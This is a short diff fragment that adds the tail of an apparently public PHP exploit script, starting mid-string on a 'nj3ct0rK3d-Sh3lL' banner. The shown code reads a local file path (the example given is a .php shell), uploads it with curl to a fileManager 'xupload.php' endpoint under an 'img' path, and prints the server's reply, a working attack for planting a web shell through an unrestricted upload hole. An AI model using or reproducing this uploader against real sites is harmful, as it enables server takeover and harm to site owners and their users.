@@ -1,0 +1,16 @@
+nj3ct0rK3d-Sh3lL#";
+$uploadfile = trim(fgets(STDIN)); # f.ex : C:\\k3d.php
+if ($uploadfile != "exit")
+{
+$ch = curl_init("http://www.example.com/modules/fileManager/xupload.php");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+array('Filedata'=>"@$uploadfile",
+'path'=>'img'));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+print "$postResult";
+}
+else break;
+?>
